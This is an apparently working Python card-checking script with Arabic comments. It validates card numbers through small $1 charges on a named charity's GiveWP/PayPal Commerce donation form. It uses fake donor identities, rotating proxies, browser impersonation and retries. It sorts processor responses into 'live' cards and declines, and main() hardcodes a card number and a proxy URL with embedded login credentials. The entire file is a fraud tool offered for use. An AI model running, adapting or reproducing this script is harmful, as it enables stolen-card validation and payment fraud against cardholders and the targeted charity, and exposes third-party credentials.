import re
import json
import base64
import secrets
import uuid
import asyncio
from faker import Faker
from curl_cffi.requests import AsyncSession
from proxy_manager import get_next_proxy

# تم تحويل الدولة إلى الولايات المتحدة بناءً على طلبك
fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 2:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")

RESPONSE_MAP = {
    "true": ("Success", "Charged - $1 ! ✅", True),
    "sucsess": ("Success", "Charged - $1 ! ✅", True),
    "do_not_honor": ("Declined", "Do Not Honor ❌", False),
    "account_closed": ("Declined", "Account Closed ❌", False),
    "payer_account_locked_or_closed": ("Declined", "Payer Account Locked Or Closed ❌", False),
    "lost_or_stolen": ("Declined", "Lost Or Stolen ❌", False),
    "cvv2_failure": ("Declined", "CVV2_FAILURE ❌", False),
    "suspected_fraud": ("Declined", "Suspected Fraud ❌", False),
    "invalid_account": ("Declined", "Invalid Account ❌", False),
    "reattempt_not_permitted": ("Declined", "Reattempt Not Permitted ❌", False),
    "account_blocked_by_issuer": ("Declined", "Account Blocked By Issuer ❌", False),
    "order_not_approved": ("Declined", "Order Not Approved ❌", False),
    "pickup_card_special_conditions": ("Declined", "Pick Card Special Conditions ❌", False),
    "payer_cannot_pay": ("Declined", "Payer Cannot Pay ❌", False),
    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
    "generic_decline": ("Declined", "Generic Decline ❌", False),
    "compliance_violation": ("Declined", "Compliance Violation ❌", False),
    "transaction_not_permitted": ("Declined", "Transaction Not Permitted ❌", False),
    "payment_denied": ("Declined", "Payment Denied ❌", False),
    "invalid_transaction": ("Declined", "Invalid Transaction ❌", False),
    "restricted_or_inactive_account": ("Declined", "Restricted Or Inactive Account ❌", False),
    "security_violation": ("Declined", "Security Violation ❌", False),
    "declined_due_to_updated_account": ("Declined", "Declined Due To Updated Account ❌", False),
    "invalid_or_restricted_card": ("Declined", "Invalid Or Restricted Card ❌", False),
    "expired_card": ("Declined", "Expired Card ❌", False),
    "cryptographic_failure": ("Declined", "CRYPTOGRAPHIC_FAILURE ❌", False),
    "transaction_cannot_be_completed": ("Declined", "TRANSACTION_CANNOT_BE_COMPLETED ❌", False),
    "declined_please_retry": ("Declined", "DECLINED_PLEASE_RETRY_LATER ❌", False),
    "tx_attempts_exceed_limit": ("Declined", "TX_ATTEMPTS_EXCEED_LIMIT ❌", False),
}

class Gateway:
    @staticmethod
    def extract_form_value(html: str, name_attr: str) -> str | None:
        """دالة مرنة لاستخراج القيم من HTML باستخدام Regex"""
        match = re.search(fr'name="{name_attr}"[^>]*value="([^"]+)"', html)
        if not match:
            match = re.search(fr'value="([^"]+)"[^>]*name="{name_attr}"', html)
        return match.group(1) if match else None

    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        token = secrets.token_hex(16)

        print(f"\n[INFO] بدء عملية الدفع للبطاقة: {card_data['cc'][:6]}******{card_data['cc'][-4:]}")
        
        async with AsyncSession(impersonate="chrome", proxies=proxies) as session:
            try:
                # Step 1: GET donation page
                print("[1] جاري تنفيذ الخطوة 1: سحب الصفحة الرئيسية للـ Donation...")
                headers_init = {
                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                }
                resp_init = await session.get(
                    "https://bukjeh.org/donations/donation-2023-2-3/",
                    headers=headers_init,
                )
                print(f"    -> تم الرد بنجاح. حالة الرد: {resp_init.status_code}")
                
                html = resp_init.text
                
                # استخدام دالة Regex الجديدة للاستخراج
                hash_val = Gateway.extract_form_value(html, "give-form-hash")
                pre = Gateway.extract_form_value(html, "give-form-id-prefix")
                give = Gateway.extract_form_value(html, "give-form-id")
                
                print(f"    -> استخراج البيانات: hash={hash_val}, prefix={pre}, form_id={give}")
                
                if not hash_val or not pre or not give:
                    print("    [خطأ] فشل في استخراج بارامترات النموذج (Form Parameters)!")
                    # حفظ الصفحة في ملف لكي نتمكن من فحصها ومعرفة السبب
                    with open("error_page.html", "w", encoding="utf-8") as f:
                        f.write(html)
                    print("    [تنبيه] تم حفظ كود الصفحة في ملف 'error_page.html'. يرجى مراجعته لاكتشاف سبب التغيير.")
                    return "Error", "Missing form parameters", False

                enc_match = re.search(r'"data-client-token":"(.*?)"', html)
                if not enc_match:
                    print("    [خطأ] لم يتم العثور على data-client-token!")
                    return "Error", "data-client-token not found", False
                
                enc = enc_match.group(1)
                dec = base64.b64decode(enc).decode("utf-8")
                
                au_match = re.search(r'"accessToken":"(.*?)"', dec)
                if not au_match:
                    print("    [خطأ] لم يتم العثور على accessToken بعد فك التشفير!")
                    return "Error", "accessToken not found", False
                
                au = au_match.group(1)
                print("    -> تم استخراج accessToken بنجاح.")

                # Step 2: First AJAX - give_process_donation
                print("[2] جاري تنفيذ الخطوة 2: إرسال طلب AJAX الأول (give_process_donation)...")
                headers_ajax1 = {
                    "origin": "https://bukjeh.org",
                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                }
                data_ajax1 = {
                    "give-fee-amount": "0",
                    "give-fee-mode-enable": "false",
                    "give-fee-status": "enabled",
                    "give-honeypot": "",
                    "give-form-id-prefix": pre,
                    "give-form-id": give,
                    "give-form-title": "Help us make A'amar",
                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-minimum": "1.00",
                    "give-form-maximum": "999999.99",
                    "give-form-hash": hash_val,
                    "give-price-id": "3",
                    "give-recurring-logged-in-only": "",
                    "give-logged-in-only": "1",
                    "_give_is_donation_recurring": "0",
                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
                    "give-amount": "1.00",
                    "give-recurring-period-donors-choice": "month",
                    "payment-mode": "paypal-commerce",
                    "give_first": user_data["first"],
                    "give_last": user_data["last"],
                    "give_email": user_data["email"],
                    "card_name": user_data["name"],
                    "card_exp_month": "",
                    "card_exp_year": "",
                    "give_action": "purchase",
                    "give-gateway": "paypal-commerce",
                    "action": "give_process_donation",
                    "give_ajax": "true",
                }
                resp_ajax1 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    headers=headers_ajax1,
                    data=data_ajax1,
                )
                print(f"    -> تمت الخطوة 2. حالة الرد: {resp_ajax1.status_code}")

                # Step 3: Second AJAX - create order
                print("[3] جاري تنفيذ الخطوة 3: إرسال طلب AJAX الثاني (إنشاء طلب Create Order)...")
                headers_ajax2 = {
                    "origin": "https://bukjeh.org",
                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                }
                params_ajax2 = {
                    "action": "give_paypal_commerce_create_order",
                }
                data_ajax2 = data_ajax1.copy()
                data_ajax2.pop("give_action", None)
                data_ajax2.pop("action", None)
                data_ajax2.pop("give_ajax", None)
                data_ajax2["give_stripe_payment_method"] = ""

                resp_ajax2 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    params=params_ajax2,
                    headers=headers_ajax2,
                    data=data_ajax2,
                )
                print(f"    -> تمت الخطوة 3. حالة الرد: {resp_ajax2.status_code}")
                
                try:
                    ajax2_json = resp_ajax2.json()
                    order_id = ajax2_json.get("data", {}).get("id")
                    print(f"    -> تم استخراج Order ID: {order_id}")
                except Exception as e:
                    print(f"    [خطأ] فشل في تحليل رد الخطوة 3 (JSON): {str(e)}")
                    return "Error", "Failed to parse Create Order response", False

                if not order_id:
                    print("    [خطأ] لم يتم العثور على Order ID في الرد!")
                    return "Error", "Failed to create PayPal order", False

                # Step 4: Confirm payment source via PayPal
                print("[4] جاري تنفيذ الخطوة 4: تأكيد وسيلة الدفع عبر PayPal...")
                headers_paypal = {
                    "authorization": f"Bearer {au}",
                    "origin": "https://assets.braintreegateway.com",
                    "referer": "https://assets.braintreegateway.com/",
                    "content-type": "application/json",
                    "paypal-client-metadata-id": token,
                }
                json_paypal = {
                    "payment_source": {
                        "card": {
                            "number": card_data["cc"],
                            "expiry": f"20{card_data['yy']}-{card_data['mm']}",
                            "security_code": card_data["cvv"],
                            "attributes": {
                                "verification": {
                                    "method": "SCA_WHEN_REQUIRED",
                                },
                            },
                        },
                    },
                    "application_context": {
                        "vault": False,
                    },
                }
                resp_paypal = await session.post(
                    f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                    headers=headers_paypal,
                    json=json_paypal,
                )
                paypal_text = resp_paypal.text.lower()
                print(f"    -> تمت الخطوة 4. حالة الرد من PayPal: {resp_paypal.status_code}")

                # Step 5: Third AJAX - approve order
                print("[5] جاري تنفيذ الخطوة 5: الموافقة على الطلب (Approve Order)...")
                headers_ajax3 = {
                    "origin": "https://bukjeh.org",
                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                }
                params_ajax3 = {
                    "action": "give_paypal_commerce_approve_order",
                    "order": order_id,
                }
                resp_ajax3 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    params=params_ajax3,
                    headers=headers_ajax3,
                    data=data_ajax2,
                )
                approve_text = resp_ajax3.text.lower()
                print(f"    -> تمت الخطوة 5. حالة الرد: {resp_ajax3.status_code}")

                # Combine both responses for classification
                combined = paypal_text + " " + approve_text
                print("[*] جاري فحص النصوص المدمجة للبحث عن حالة الدفع...")

                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in combined:
                        print(f"    -> تم العثور على تطابق: {key} -> {msg}")
                        return status, msg, is_live

                # Fallback: try JSON error extraction
                try:
                    error_data = resp_ajax3.json()
                    if 'data' in error_data and 'error' in error_data['data']:
                        err_msg = error_data['data']['error']
                        print(f"    -> تم استخراج رسالة خطأ من JSON: {err_msg}")
                        return "Declined", f"{err_msg} ❌", False
                except:
                    pass

                print("    [تنبيه] لم يتم التعرف على حالة الدفع في الردود.")
                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                print(f"[استثناء/Exception] حدث خطأ أثناء تنفيذ الدفع: {str(e)}")
                return "Error", f"Exception: {str(e)}", False


async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        print("❌ تنسيق البطاقة غير صالح.")
        return "Failed", "Invalid card format", False

    max_attempts = 5

    for attempt in range(max_attempts):
        print(f"\n==============================================")
        print(f"🔄 المحاولة رقم: {attempt + 1} من أصل {max_attempts}")
        
        user_data = tools.userdata()
        
        current_proxy_url = get_next_proxy() if not proxy_url else proxy_url
        proxies = {"http": current_proxy_url, "https": current_proxy_url} if current_proxy_url else None
        
        print(f"🌐 البروكسي المستخدم: {current_proxy_url}")

        status, msg, is_live = await Gateway.charge_card(
            card_data=card_data,
            user_data=user_data,
            proxies=proxies,
        )

        if "Order Not Approved" in msg:
            print(f"⚠️ المحاولة {attempt + 1} انتهت بـ: Order Not Approved. جاري إعادة المحاولة...")
            if attempt == max_attempts - 1:
                print("⛔ تم استنفاد جميع المحاولات.")
                return status, msg, is_live
            continue
        else:
            print(f"✅ تم الحصول على رد نهائي في المحاولة {attempt + 1}.")
            return status, msg, is_live

    return "Error", "Max attempts exceeded unexpectedly", False
    
async def main():
    test_card = "4211566115568609|12|28|321"
    
    proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"

    print("🚀 Testing gateway (ST Charge)...")
    print(f"💳 Card: {test_card}")
    print(f"🌐 Initial Proxy Configured: {proxy}")

    status, message, is_live = await process_paypal_1(test_card, proxy_url=proxy)

    print("\n--- Execution Result ---")
    print(f"Status  : {status}")
    print(f"Message : {message}")
    print(f"Live    : {is_live}")

if __name__ == "__main__":
    asyncio.run(main())
